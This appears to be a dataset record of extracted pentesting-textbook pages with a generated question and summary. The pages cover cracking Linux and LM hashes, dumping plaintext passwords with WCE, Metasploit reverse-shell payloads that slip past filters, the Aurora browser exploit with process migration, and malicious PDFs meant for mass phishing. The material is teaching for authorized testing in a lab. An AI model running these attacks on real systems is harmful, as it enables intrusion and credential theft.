brute-force passwords, we can use wordlists\ncontaining known passwords, common passwords, dictionary words, combi-\nnations of dictionary words padded with numbers and symbols at the end,\nand so on. (We’ll see an example of using a wordlist with John the Ripper\nin “Cracking Linux Passwords” on page 212). a real-worlD examPle\nLegacy password hashing once made all the difference on one of my pentests . The domain controller was Windows Server 2008, with a strong security pos-\nture . The workstations throughout the enterprise were reasonably secure, too,\nhaving recently been upgraded to fully patched Windows 7 systems . There\nwas, however, one promising light in the dark: a Windows 2000 box that was\nmissing several security patches . I was able to quickly gain system privileges on\nthe machine using Metasploit . The trouble was that, while on paper, the penetration test was now a suc-\ncess, compromising the machine had gained me next to nothing . The system\ncontained no sensitive files, and it was the only machine on this particular net-\nwork, isolated from the new, updated Windows domain . It had all the trappings\nof a domain controller, except it had no clients . All of the other machines in\nthe environment were members of the new Windows 2008 domain controller’s\ndomain . Though technically I was now a domain administrator, I was no further\nalong on the pentest than I was before I found the Windows 2000 machine . Since this was the domain controller, the domain user password hashes\nwere included locally . Windows 2000, like Windows XP, stored the LM hashes\nof passwords . The client’s old domain administrator password was strong; it\nhad about 14 characters; included uppercase letters, lowercase letters, numbers,\nand symbols; and was not based on a dictionary word . Fortunately, because it\nwas LM hashed, I was able to get the password back in a matter of minutes . What do you think the domain administrator’s password was on the\nnew domain? You guessed it . It was the same as the domain administrator’s\npassword on the old domain . The Windows 2000 box had not been used in\nover six months, but it was still running, and it used an insecure hashing algo-\nrithm . Also, the client wasn’t changing their passwords regularly . These two\nthings combined to bring down what was otherwise a strong security posture . I\nwas able to access every system in the environment just by logging in with the\ndomain administrator password I found on the compromised Windows 2000\nsystem . Password Attacks 211\nCracking Linux Passwords\nWe can also use John the Ripper against the Linux password hashes we\ndumped after exploiting the Vsftpd server backdoor in Chapter 8, as shown\nin Listing 9-16. root@kali# cat linuxpasswords.txt\ngeorgia:$1$CNp3mty6$lRWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7:::\nroot@kali# johnlinuxpasswords.txt --wordlist=passwordfile.txt\nLoaded 1 password hash (FreeBSD MD5 [128/128 SSE2 intrinsics 4x])\npassword (georgia)\nguesses: 1 time: 0:00:00:00 DONE (Sun Jan 11 05:05:31 2015) c/s: 100\ntrying: password - Password123\nListing 9-16: Cracking Linux hashes with John the Ripper\nUser georgia has an MD5 hash (we can tell from the $1$ at the beginning\nof the password hash). MD5 can’t be brute-forced in a reasonable amount of\ntime. Instead, we use a wordlist with the --wordlist option in John the Ripper. John the Ripper’s success at cracking the password depends on the inclu-\nsion of the correct password in our wordlist. mangling worDlists witH JoHn tHe riPPer\nWhen required by a password policy to include a number and/or a symbol in\na password, many users will just tack them on to the end of a dictionary word . Using John the Ripper’s rules functionality, we can catch this and other common\nmutations that may slip by a simple wordlist . Open the John the Ripper configu-\nration file at /etc/john/john.conf in an editor and search for List.Rules:Wordlist . Beneath this heading, you can add mangling rules for the wordlist . For example,\nthe rule $[0-9]$[0-9]$[0-9] will add three numbers to the end of each word\nin the wordlist . You can enable rules in John the Ripper by using the flag\n--rules at the command line . More information on writing your own rules\ncan be found at http://www.openwall.com/john/doc/RULES.shtml . Cracking Configuration File Passwords\nFinally, let’s try to crack the MD5 hashed passwords we found in the\nFileZilla FTP server configuration file we downloaded with the Zervit 0.4\nfile inclusion vulnerability. As you’ll see, sometimes we don’t even need to\ncrack a password hash. For example, try entering the hash for the user\ngeorgia, 5f4dcc3b5aa765d61d8327deb882cf99, into a search engine. The first\nfew hits confirm that georgia’s password is password. Additionally, searching\ntells us that the account newuser is created when a FileZilla FTP server is\ninstalled with the password wampp. 212 Chapter 9\nNow try logging in to the Windows XP target’s FTP server with these\ncredentials. Sure enough, login is successful. The administrator of this\nsystem forgot to change the default password for the built-in FTP account. If we were not able to recover the plaintext passwords this easily, we could\nagain use John the Ripper with a wordlist, as discussed previously. Rainbow Tables\nRather than taking a wordlist, hashing each entry with the relevant algo-\nrithm, and comparing the resulting hash to the value to be cracked, we\ncan speed up this process considerably by having our wordlist prehashed. This, of course, will take storage space—more with longer hash lists, and\napproaching infinity as we try to store every possible password hash value\nfor brute forcing. A set of precomputed hashes is known as a rainbow table. Rainbow tables\ntypically hold every possible hash entry for a given algorithm up to a certain\nlength with a limited character set. For example, you may have a rainbow\ntable for MD5 hashes that contains all entries that are all lowercase letters\nand numbers with lengths between one and nine. This table is about 80 GB—\nnot so bad with today’s price of storage, but keep in mind this is only a very\nlimited amount of the possible keyspace for MD5. Given its limited keyspace (discussed previously), an LM hash appears\nto be an ideal candidate for using rainbow tables. A full set of LM hash\nrainbow tables is about 32 GB. You can download pregenerated sets of hashes from http://project\n-rainbowcrack.com/table.htm. The tool Rcrack in Kali can be used to sift\nthrough the rainbow tables for the correct plaintext. Online Password-Cracking Services\nThe current hip thing to do in IT is to move things to the cloud, and pass-\nword cracking is no different. By leveraging multiple high-spec machines,\nyou can get faster, more comprehensive results than you could with just\na virtual machine on your laptop. You can, of course, set up up your own\nhigh-powered machines in the cloud, create your own wordlists, and so on,\nbut there are also online services that will take care of this for you for a\nfee. For example, https://www.cloudcracker.com/ can crack NTLM Windows\nhashes, SHA-512 for Linux, WPA2 handshakes for wireless, and more. You\nsimply upload your password hash file, and the cracker does the rest. dumping Plaintext Passwords from memory with\nwindows Credential editor\nWhy bother cracking password hashes if we can get access to plaintext\npasswords? If we have access to a Windows system, in some cases we can pull\nplaintext passwords directly from memory. One tool with this functionality\nis the Windows Credential Editor (WCE). We can upload this tool to an\nexploited target system, and it will pull plaintext passwords from the Local\nPassword Attacks 213\nSecurity Authority Subsystem Service (LSASS) process in charge of enforcing\nthe system’s security policy. You can download the latest version of WCE from\nhttp://www.ampliasecurity.com/research/wcefaq.html.",
    "question": "What are the key steps and techniques involved in exploiting vulnerabilities to gain system access and then cracking password hashes on both Windows and Linux systems?",
    "summary": "The text explains how to exploit multiple systems using Metasploit and other tools, including gaining system privileges through web vulnerabilities, exploiting a backdoored FTP server, and accessing password hashes. It also covers techniques for cracking passwords, such as using John the Ripper with wordlists and rainbow tables, and discusses the importance of strong password management. Finally, it describes how to retrieve plaintext passwords from memory using the Windows Credential Editor."
  },
  {
    "start": 67,
    "end": 73,
    "text": "An example of running\nWCE is shown in Listing 9-17. C:\\>wce.exe -w\nwce.exe -w\nWCE v1.42beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by Hernan Ochoa\n(hernan@ampliasecurity.com)\nUse -h for help. georgia\\BOOKXP:password\nListing 9-17: Running WCE\nHere WCE found the plaintext of the user georgia’s password. The\ndownside to this attack is that it requires a logged-in user for the password\nto be stored in memory. Even if you were able to get a plaintext password or\ntwo with this method, it is still worth dumping and attempting to crack any\npassword hashes you can access. summary\nReversing password hashes is an exciting field, and as the speed of hard-\nware increases, it becomes possible to crack stronger hashes faster. Using\nmultiple CPUs and even the graphics processing units (GPUs) on video\ncards, password crackers can try many hashes very quickly. Our virtual\nmachines don’t have much processing power, but even your average modern\nlaptop is much faster than the machines that were used for password crack-\ning just a few short years ago. The cutting edge of password cracking these\ndays is taking to the cloud and harnessing multiple top-spec cloud servers\nfor cracking. You’ll even find some cloud-based password-cracking services. As you’ve seen in this chapter, using information gathered from suc-\ncessful exploits in Chapter 8, we’ve managed to reverse password hashes\nto recover plaintext passwords for some services and the systems themselves. Having managed to get a foothold on the systems, let’s look at some advanced\nattack methods that can help us if we can’t find anything vulnerable when\nlistening on the network. We still have the Windows 7 machine to exploit,\nafter all. 214 Chapter 9\n10\nClient-siDe e xPloitation\nThe vulnerabilities we’ve studied so far have been\nlow-hanging fruit, and all have come up on real\nengagements. It’s common on penetration tests to\nfind vulnerable services listening on ports, unchanged\ndefault passwords, misconfigured web servers, and\nso on. However, clients who put a lot of time and effort into their security pos-\nture may be free from these kinds of vulnerabilities. They may have all secu-\nrity patches in place; they may periodically audit passwords and remove any\nthat can be easily guessed or cracked. They may control user roles: Regular\nusers may not have administrative rights on their workstations, and any soft-\nware that is installed is investigated and maintained by the security staff. As\na result, there may not be many services to even try to attack. Yet, despite the deployment of the latest and greatest security technolo-\ngies and the employment of crack security teams, high-profile companies\n(with potentially high payoffs for attackers) are still being breached. In this\nchapter we’ll examine a few different kinds of attacks that don’t require\ndirect network access. We’ll study attacks that target local software on a\nsystem—software that is not listening on a port. Because we won’t attack a computer or listening port directly, and\nbecause we need to come up with another way to attack a device inside a\ncorporate perimeter, we need to select our payload accordingly. Whereas\na normal bind shell might work fine for systems directly exposed to the\nInternet or listening on a port on our local network, we will at the very least\nbe limited to reverse connections here. But first let’s dive a little deeper into the Metasploit payload system and\ncheck out some other payloads that may be useful to you. Bypassing Filters with metasploit Payloads\nIn previous chapters we discussed the Metasploit payload system, including\nsingle versus staged payloads and bind shells versus reverse shells. We also\ntalked briefly about Metasploit’s Meterpreter payload (which we’ll discuss in\ndepth in Chapter 13). When you use the command show payloads on a mod-\nule, you may see several payloads that may be new to you. We’ll look at a\nfew in this section that can be used to bypass filtering technologies you may\nencounter on your pentests. All Ports\nOur network is set up such that our attack and target virtual machines are\non the same network with no firewalls or other filters blocking communica-\ntions. However, in your pentesting career, you may encounter clients with\nall sorts of filtering setups. Even a reverse connection may not be able to\nget through the filters and connect back to your attack machine on just\nany port. For example, a client network may not allow traffic to leave the\nnetwork on port 4444, the default for Metasploit reverse_tcp payloads. It may\nallow traffic out only on specific ports, such as 80 or 443 for web traffic. If we know which ports are allowed through the filter, we can set the\nLPORT option to the relevant port. The Metasploit reverse_tcp_allports payloads\ncan help us find a port to connect to. As the name suggests, this payload\ncommunication method will try all ports until it finds a successful connec-\ntion back to Metasploit. Let’s test this functionality with the windows/shell/reverse_tcp_allports pay-\nload, as shown in Listing 10-1. We are using the MS08-067 exploit against\nWindows XP. msf exploit(ms08_067_netapi) > set payload windows/shell/reverse_tcp_allports\npayload => windows/shell/reverse_tcp_allports\nmsf exploit(ms08_067_netapi) > show options\n--snip--\nPayload options (windows/shell/reverse_tcp_allports):\n216 Chapter 10\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC thread yes Exit technique: seh, thread, process, none\nLHOST 192.168.20.9 yes The listen address\nuLPORT 1 yes The starting port number to connect back on\n--snip--\nmsf exploit(ms08_067_netapi) > exploit\n[*] Started reverse handler on 192.168.20.9:1\n--snip--\n[*] Sending encoded stage (267 bytes) to 192.168.20.10\n[*] Command shell session 5 opened (192.168.20.9:1 -> 192.168.20.10:1100) at 2015-05-14\n22:13:20 -0400 v\nListing 10-1: Windows/shell/reverse_tcp_allports payload\nHere, the LPORT u option specifies the first port to try. If that port doesn’t\nwork, the payload will try each subsequent port until the connection suc-\nceeds. If the payload reaches 65535 without success, it starts trying again at\nport 1 and runs infinitely. Because there is no filter blocking our traffic, the first port Metasploit\ntries, port 1, creates a successful connection, as shown at v. Though this\npayload will work in many cases, some filtering technologies will be able\nto stop it regardless of the port it tries to connect to. One downside to this\npayload is that it may run for a long time in an attempt to find an unfiltered\nport. If a user sees the application hanging, he or she may close it before\nthe payload is successful. HTTP and HTTPS Payloads\nWhile some filters may allow all traffic out on certain ports, the most\nadvanced filtering systems use content inspection to screen for legitimate\nprotocol-specific traffic. This can pose a problem for our payloads. Even\nthough our Meterpreter payload communication is encrypted—the content\ninspection won’t be able to say, “That’s Metasploit, go away!”—the filter will\nbe able to tell that the traffic going out on port 80 doesn’t meet the HTTP\nspecification. To address this challenge, the developers of Metasploit created HTTP\nand HTTPS payloads. These payloads follow the HTTP and HTTPS speci-\nfications so that even content-inspection filters will be convinced that our\ntraffic is legitimate. Also, these payloads are packet based, rather than\nstream based like the TCP payloads. That means they aren’t limited to a\nspecific connection. If you lose network communication briefly and lose all\nyour Metasploit sessions, HTTP and HTTPS sessions can recover and recon-\nnect. (We’ll see an example using these payloads in “Java Vulnerability” on\npage 230.)\nClient-Side Exploitation 217\nThough HTTP and HTTPS payloads will get you through most filter-\ning technologies, you may find yourself in an even more complex filtering\nsituation. For example, I tested one client where only the Internet Explorer\nprocess, when started by a domain-authenticated user, could reach the\nInternet. Employees could browse the Internet to perform their business,\nbut they were somewhat limited. For instance, they couldn’t use an instant\nmessenger client. While this probably annoyed some employees, it was a\ngood idea for security reasons. Even if we had been able to successfully\nexploit something, even HTTP and HTTPS payloads could not get out to\nthe Internet. (In “Browser Exploitation” on page 219, we’ll look at some\nattack methods that would allow us to exploit the Internet Explorer process\nwhen a legitimate domain user is logged in and then connect to the outside\nworld.)\nMeterpreter HTTP and Meterpreter HTTPS use the proxy settings\nof Internet Explorer to navigate any proxies necessary to call out to the\nInternet. For this reason, if your target process is running as the System\nuser, these proxy settings may not be defined, and these payloads may fail. note There is also a Meterpreter payload, reverse_https_proxy, that allows the attacker\nto manually add in any necessary proxy settings. Client-side attacks\nNow let’s turn our attention to running client-side attacks. Instead of directly\nattacking a service listening on a port, we’ll create a variety of malicious\nfiles that, when opened in vulnerable software on the target machine, will\nresult in a compromise. So far all of our attacks have involved some sort of service listening on\na port, be it a web server, FTP server, SMB server, or otherwise. When we\nbegan our pentest, one of the first things we did was port scan our targets\nto see which services were listening. When we start a pentest, the potential\nvulnerabilities are practically limitless. As we begin running tools, performing manual analysis, and research-\ning, the exploitation possibilities gradually decrease until we’re left with\na limited number of issues on the target systems. Those issues have been\nserver-side issues—services listening on ports. What we are missing is any\npotentially vulnerable software that is not listening on a port—client-side\nsoftware. Software like web browsers, document viewers, music players, and so on\nare subject to the same sort of issues as web servers, mail servers, and every\nother network-based program. 218 Chapter 10\nOf course, because client-side software isn’t listening on the network,\nwe can’t directly attack it, but the general principle is the same. If we can\nsend unexpected input to a program to trigger a vulnerability, we can\nhijack execution, just as we exploited server-side programs in Chapter 8. Because we can’t send input to client-side programs directly over the net-\nwork, we must entice a user to open a malicious file. As security is taken more seriously and server-side vulnerabilities become\nmore difficult to find from an Internet-facing perspective, client-side exploita-\ntion is becoming key to gaining access to even carefully protected internal\nnetworks. Client-side attacks are ideal for assets such as workstations or\nmobile devices that lack an Internet-facing IP address. Though from the\nperspective of the Internet we can’t directly access those systems, they can\ntypically call out to the Internet, or to a pentester-controlled system, if we\ncan hijack execution. Unfortunately, the success of client-side attacks relies on somehow\nmaking sure that our exploit is downloaded and opened in a vulnerable\nproduct. In the next chapter, we’ll look at some techniques to lure users\ninto opening malicious files; for now we’ll look at some client-side exploits,\nbeginning with what must be the most popular target for client-side exploi-\ntation: web browsers. Browser Exploitation\nWeb browsers are made up of code to render web pages. Just as we can send\nmalformed input to server software, if we open a web page with malicious\ncode to trigger a security issue, we can potentially hijack execution in the\nbrowser and execute a payload. Though the delivery is a bit different, the fun-\ndamental concept is the same. All of the most common browsers have been\nsubject to security issues—Internet Explorer, Firefox, and even Mobile Safari. iPHone JailBreaking Via Browser exPloitation\nIn the past, browser exploitation has been instrumental in iPhone jailbreak-\ning . While later versions of iOS implement a security feature called mandatory\ncode signing, which requires that all executed code be approved by Apple,\nMobile Safari (the web browser on the iPhone) gets a pass because to render\nweb pages, it must be able to run unsigned code . Apple can’t go through all the\npages on the Internet and sign everything that doesn’t contain malicious code . And if the iPhone can’t view web pages, everyone will just go buy an Android\nphone—the last thing Apple wants . When iOS 4 renders PDF documents in\nMobile Safari, one of the fonts includes a security vulnerability . This client-side\nattack allows jailbreakers to gain a foothold on iPhones just by tricking a user\ninto opening a malicious link in the browser . Client-Side Exploitation 219\nLet’s consider a famous vulnerability in Internet Explorer.\n\nThe Aurora\nexploit was used in 2010 against major companies such as Google, Adobe,\nand Yahoo!. At the time of the Aurora attacks, Internet Explorer contained a\nzero-day vulnerability—that is, a vulnerability that had not yet been patched. (Even a fully updated version of Internet Explorer could be compromised\nif a user could be tricked into opening a malicious web page, triggering the\nvulnerability.)\nMicrosoft has released patches for Internet Explorer, but as with other\nsecurity patches, users sometimes overlook updating their browsers, and the\nversion of Internet Explorer installed on the Windows XP target doesn’t have\nthe necessary security patch to protect against the Aurora exploit. We’ll use Metasploit to take control of a target machine by attacking a\nvulnerable browser using the Aurora Metasploit module, exploit/windows/\nbrowser/ms10_002_aurora, shown in Listing 10-2. note Client-side Metasploit modules are fundamentally the same as the server-side mod-\nules we have used so far, except that the options are a bit different: Instead of sending\nexploits to a remote host on the network, we set up a server and wait for a browser to\naccess our page. msf > use exploit/windows/browser/ms10_002_aurora\nmsf exploit(ms10_002_aurora) > show options\nModule options (exploit/windows/browser/ms10_002_aurora):\nName Current Setting Required Description\n---- --------------- -------- -----------\nuSRVHOST 0.0.0.0 yes The local host to listen on. This must be an address\non the local machine or 0.0.0.0\nvSRVPORT 8080 yes The local port to listen on. wSSL false no Negotiate SSL for incoming connections\nSSLCert no Path to a custom SSL certificate (default is randomly\ngenerated)\nSSLVersion SSL3 no Specify the version of SSL that should be used\n(accepted: SSL2, SSL3, TLS1)\nxURIPATH no The URI to use for this exploit (default is random)\nExploit target:\nId Name\n-- ----\ny0 Automatic\nListing 10-2: Internet Explorer Aurora Metasploit module\nNotice in the options for the module that instead of RHOST we see the\nSRVHOST u option. This is the local IP address for the server. By default this\naddress is set to 0.0.0.0 to listen on all addresses on the local system. The\n220 Chapter 10\ndefault port to listen on, the SRVPORT v option, is 8080. You can change this\nport number to 80 (the default port for web servers) as long as no other\nprogram is using the port. You can even use an SSL connection w. If we set the URIPATH x option, we can specify a specific URL for the\nmalicious page. If we don’t set anything here, a random URL will be used. Because the exploitation will take place entirely inside the browser, our\nexploit will work regardless of the version of Windows running y, as long\nas Internet Explorer is subject to the Aurora vulnerability. Next we set the module options for our environment. The payloads\nfor this module are the same as the Windows payloads we’ve already seen. Exploiting the browser is no different from exploiting any other program\non the system, and we can run the same shellcode. We’ll use the windows/\nmeterpreter/reverse_tcp payload for this example to illustrate some client-side\nattack concepts, as shown in Listing 10-3. note Make sure the apache2 web server is not running on port 80 with service\napache2 stop. msf exploit(ms10_002_aurora) > set SRVHOST 192.168.20.9\nSRVHOST => 192.168.20.9\nmsf exploit(ms10_002_aurora) > set SRVPORT 80\nSRVPORT => 80\nmsf exploit(ms10_002_aurora) > set URIPATH aurora\nURIPATH => aurora\nmsf exploit(ms10_002_aurora) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(ms10_002_aurora) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(ms10_002_aurora) > exploit\n[*] Exploit running as background job. [*] Started reverse handler on 192.168.20.9:4444 u\n[*] Using URL: http://192.168.20.9:80/aurora v\n[*] Server started. Listing 10-3: Setting options and launching the Aurora module\nAs you can see in Listing 10-3, once we’ve set the options and run the\nmodule, a web server is started in the background on the selected SRVPORT at\nthe selected URIPATH as shown at v. Additionally, a handler is set up for the\nselected payload u. Now we’ll use Internet Explorer on the Windows XP target to browse\nto the malicious site. In Metasploit you should see that the page has been\nserved and is attempting to exploit the vulnerability, as shown in Listing 10-4. Although our Windows XP browser is vulnerable, it may take a couple tries\nto exploit the browser successfully. Exploiting the Aurora vulnerability is not as reliable as exploiting the\nother vulnerabilities we’ve discussed so far in this book. If Internet Explorer\ncrashes, but you do not receive a session, try browsing to the exploit page\nagain. Client-Side Exploitation 221\nmsf exploit(ms10_002_aurora) > [*] 192.168.20.10 ms10_002_aurora -\nSending Internet Explorer \"Aurora\" Memory Corruption\n[*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1376) at\n2015-05-05 20:23:25 -0400 u\nListing 10-4: Receiving a client-side session\nThough this exploit may not work every time, the target browser is vul-\nnerable and a couple of tries should do it. If the exploit succeeds, you will\nreceive a session, as shown at u. We are not automatically dropped into the\nsession. Use sessions -i <session id> to interact with the Meterpreter session. Though we have successfully exploited the browser and gained a foot-\nhold on the target system, our challenges are not over. If you look back at the\nWindows XP machine and try to continue using Internet Explorer, you’ll find\nthat it’s no longer functioning. The exploitation involved in getting our ses-\nsion has made the browser unusable. The problem for us is that users who\nhave been tricked into visiting our malicious site will naturally want to con-\ntinue using their browsers. They may force-quit the browser, or the browser\nmay crash on its own due to its unstable state. When the browser closes, we\nlose our Meterpreter session. msf exploit(ms10_002_aurora) > [*] 192.168.20.10 - Meterpreter session 1 closed. Reason: Diedu\nOur Meterpreter payload resides entirely inside the memory of the\nexploited process. If the browser dies or is closed by the user, our session\nalso dies, as you can see at u. We can lose our foothold on the system just\nas quickly as we gained it. We need a way to keep our Meterpreter session alive, even if the exploited\nprocess—in this case, the Internet Explorer browser—dies. But first, we\nneed to stop our Metasploit web server so we can make some changes to the\nmalicious page to fix this problem, as shown in Listing 10-5. msf exploit(ms10_002_aurora) > jobsu\nJobs\n====\nId Name\n-- ----\n0 Exploit: windows/browser/ms10_002_aurora\nmsf exploit(ms10_002_aurora) > kill 0v\nStopping job: 0... [*] Server stopped. Listing 10-5: Killing a background job in Metasploit\nWe can see everything running in the background in Metasploit by enter-\ning jobs u. To stop a job running in the background, enter kill <job number> v. 222 Chapter 10\nBecause Meterpreter lives entirely inside the memory of the exploited\nprocess and that process is doomed to die, we need some way to move our\nsession out of the Internet Explorer process and into one that is more likely\nto stick around. Running Scripts in a Meterpreter Session\nUnlike network attacks, where we will see a session right away if our attack\nsucceeds, when performing client-side attacks, we must wait until a user\naccesses our malicious page. Even if we find a way to move Meterpreter into\nanother process, sessions could come in at any time. We can’t be distracted\nat any point during our pentest or we risk losing a session. It would be ideal\nif we could automatically run commands in our Meterpreter session so that\nwe don’t have to sit idly, waiting for a browser to access our malicious server. Meterpreter scripts that can be run in an open session can be found at\n/usr/share/metasploit-framework/scripts/meterpreter in Kali. We’ll look at more\nexamples of Meterpreter scripts in Chapter 13, but for now let’s look at one\nspecific Meterpreter script that will work well with our current scenario. The\nscript migrate.rb allows us to move Meterpreter from the memory of one pro-\ncess to another, which is exactly what we need here. To run a Meterpreter\nscript inside an active Meterpreter session, enter run <script name>, as shown\nin Listing 10-6. You may be presented with help information about how to\nuse the script correctly, as we are shown here. meterpreter > run migrate\n\nOPTIONS:\n-f Launch a process and migrate into the new process u\n-h Help menu. -k Kill original process. -n <opt> Migrate into the first process with this executable name (explorer.exe) v\n-p <opt> PID to migrate to. w\nListing 10-6: Running a Meterpreter script\nWhen we attempt to run the migrate script, we see a few options. We can\nlaunch a new process and migrate into that process, as shown at u; migrate\ninto a process with a given name v; or choose the process by process ID, as\nshown at w. advanced Parameters\nIn addition to the module and payload options, Metasploit modules have\nadvanced parameters. We can see the available advanced parameters with\nthe command show advanced, as shown in Listing 10-7. msf exploit(ms10_002_aurora) > show advanced\nModule advanced options:\nClient-Side Exploitation 223\nName : ContextInformationFile\nCurrent Setting:\nDescription : The information file that contains context information\n--snip--\nName : AutoRunScriptu\nCurrent Setting:\nDescription : A script to run automatically on session creation. --snip--\nName : WORKSPACE\nCurrent Setting:\nDescription : Specify the workspace for this module\nListing 10-7: Metasploit advanced parameters\nOne of the advanced settings for our chosen payload is AutoRunScript u. When set, this setting will allow us to automatically run a Meterpreter script\nwhen a session opens. We can set this parameter to automatically run the migrate script when\na Meterpreter session opens. This way, when the browser dies, as long as\nthe migrate script has finished, our session will be safe from the crash. Additionally, by running the script automatically, we can migrate whenever\na user accesses the malicious page, regardless of whether you have your eyes\non Msfconsole when the session comes in, as shown in Listing 10-8. msf exploit(ms10_002_aurora) > set AutoRunScript migrate -fu\nAutoRunScript => migrate -f\nmsf exploit(ms10_002_aurora) > exploit\n[*] Exploit running as background job. [*] Started reverse handler on 192.168.20.9:4444\n[*] Using URL: http://192.168.20.9:80/aurora\n[*] Server started. Listing 10-8: Setting the AutoRunScript parameter\nTo set advanced parameters, use the syntax set <parameter to set> <value>\n(the same as setting regular options). For example, in Listing 10-8, we tell\nthe migrate script to spawn a new process to migrate into with the -f flag u,\nand then we start the malicious server again. Now browse to the malicious page from the Windows XP target again\n(see Listing 10-9). msf exploit(ms10_002_aurora) > [*] 192.168.20.10 ms10_002_aurora - Sending Internet\nExplorer \"Aurora\" Memory Corruption\n[*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1422) at 2015-05-05 20:26:15 -0400\n[*] Session ID 2 (192.168.20.9:4444 -> 192.168.20.10:1422) processing AutoRunScript 'migrate -f' u\n[*] Current server process: iexplore.exe (3476)\n224 Chapter 10\n[*] Spawning notepad.exe process to migrate to\n[+] Migrating to 484\n[+] Successfully migrated to process v\nListing 10-9: Automatically migrating\nThis time we get a session saying that the AutoRunScript parameter is pro-\ncessed automatically u. The migrate script spawns a notepad.exe process and\nmoves into it v. When Internet Explorer dies, our session remains alive. Though automatically migrating is a good idea when using a browser\nexploit, it still takes a few seconds for the migration to happen—seconds\nduring which the user could close the browser and kill our session. Fortunately,\nthe advanced Meterpreter option PrependMigrate, shown here, will migrate\neven faster, before the payload is run. Name : PrependMigrate\nCurrent Setting: false\nDescription : Spawns and runs shellcode in new process\nYou can set this option to true as an alternative to the AutoRunScript we\nused earlier. This has been just one example of a browser exploit. Metasploit has\nother modules for exploiting vulnerabilities in Internet Explorer as well\nas other popular web browsers. As more organizations have hardened their\nexternal security posture, browser exploitation has given over the keys to\nthe kingdom in many pentests as well as attacks. note The Aurora vulnerability was patched in 2010, but users and organizations are\nbad at keeping their browsers up to date, so this exploit still finds targets today. Additionally, though new remote exploits for operating systems are rare, major\nbrowsers such as Internet Explorer fall victim to new client-side attacks on a regular\nbasis. Use Msfupdate as discussed in Chapter 4 to get the latest modules for new\nvulnerabilities, some of which may not even be patched by the vendor at the time of\nthe module’s release. Note that running Msfupdate may affect how Metasploit works,\nwhich may make it more difficult to follow along with the book. Therefore, you may\nnot want to update Metasploit until after you have read through the book. Now let’s look at some other client-side software that can be exploited\nto gain command execution on a target system. PDF Exploits\nPortable Document Format (PDF) software can also be exploited. If a\nuser can be enticed to open a malicious PDF in a vulnerable viewer, the\nprogram can be exploited. The most popular PDF viewer for Windows systems is Adobe Reader. Like browsers, Adobe Reader has a history littered with security holes. Also\nlike browsers, even when a patch-management process is in place, regu-\nlarly updating the underlying operating system, PDF software is often for-\ngotten, and remains at an older, vulnerable version. Client-Side Exploitation 225\nExploiting a PDF Vulnerability\nOur Windows XP target has an outdated version of Adobe Reader 8.1.2\ninstalled that is subject to CVE-2008-2992, a stack-based buffer over-\nflow. The corresponding Metasploit module is exploit/windows/fileformat/\nadobe_utilprintf. The options for this module are a bit different than anything we’ve\nseen thus far, as shown in Listing 10-10. This is a client-side attack, so there\nis no RHOST option, but unlike our browser attack, there are also no SRVHOST\nor SRVPORT options. This module simply creates a malicious PDF; hosting it\nfor delivery and setting up a payload handler is up to us. Of course, we have\nall the skills necessary to perform both these tasks easily. msf > use exploit/windows/fileformat/adobe_utilprintf\nmsf exploit(adobe_utilprintf) > show options\nModule options (exploit/windows/fileformat/adobe_utilprintf):\nName Current Setting Required Description\n---- --------------- -------- -----------\nuFILENAME msf.pdf yes The file name. Exploit target:\nId Name\n-- ----\nv0 Adobe Reader v8.1.2 (Windows XP SP3 English)\nmsf exploit(adobe_utilprintf) > exploit\n[*] Creating 'msf.pdf' file... [+] msf.pdf stored at /root/.msf4/local/msf.pdf w\nListing 10-10: A Metasploit PDF exploit\nAs you can see, the only option for the PDF exploit is the name of the\nmalicious file to be generated u. We can leave the default, msf.pdf. For this\nexample, we’ll have Metasploit use the default payload, windows/meterpreter/\nreverse_tcp on port 4444. When we enter exploit, Metasploit generates a PDF\nthat will exploit this vulnerability in a vulnerable version of Adobe Reader\non Windows XP SP3 English v. The malicious PDF is stored as /root/.msf4/\nlocal/msf.pdf w. Now we need to serve the PDF and set up a handler for the payload, as\nshown in Listing 10-11. msf exploit(adobe_utilprintf) > cp /root/.msf4/local/msf.pdf /var/www\n[*] exec: cp /root/.msf4/local/msf.pdf /var/www\nmsf exploit(adobe_utilprintf) > service apache2 start\n[*] exec service apache2 start\n226 Chapter 10\nStarting web server: apache2. msf exploit(adobe_utilprintf) > use multi/handleru\nmsf exploit(handler) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.20.9\nlhost => 192.168.20.9\nmsf exploit(handler) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1422) at\n2015-05-05 20:26:15 -0400 v\nListing 10-11: Serving the malicious PDF and using a handler\nWe copy the file to the Apache web server folder and start the server,\nif it is not already running. We’ll look at ways to lure users into opening\nmalicious files later in this chapter, but for now we’ll just open the mali-\ncious PDF in Adobe Reader 8.1.2 on our Windows XP target. First, though,\nwe need to set up a handler for the payload. We can use the multi/handler u\nmodule as we learned in Chapter 4. (Be sure to kill the Aurora job if its\nhandler is also listening on port 4444 to free up this port for multi/handler\nuse). When we open the malicious PDF, we again receive a session v. Typically with an attack like this we won’t be targeting just one user. For\nbest results we might use this malicious PDF as part of a social-engineering\ncampaign, as discussed in the next chapter, by sending out a few to even hun-\ndreds of malicious PDFs in an attempt to entice users to open them. The\nmulti/handler listener we set up previously will close as soon as it sees the\nfirst connection, causing us to miss any other connections that come in from\nother users opening the PDF. It would be much better if we could leave our\nlistener open to catch additional incoming connections. As it turns out, an advanced option for the multi/handler module solves\nthis problem. As shown in Listing 10-12, the advanced option ExitOnSession,\nwhich is set to true by default, specifies whether the listener closes after it\nreceives a session. If we set this option to false, the listener will stay open\nand allow us to catch multiple sessions with a single handler. msf exploit(handler) > show advanced\nModule advanced options:\n--snip--\nName : ExitOnSession\nCurrent Setting: true\nDescription : Return from the exploit after a session has been created\nmsf exploit(handler) > set ExitOnSession falseu\nExitOnSession => false\nmsf exploit(handler) > exploit -jv\n[*] Exploit running as background job. [*] Started reverse 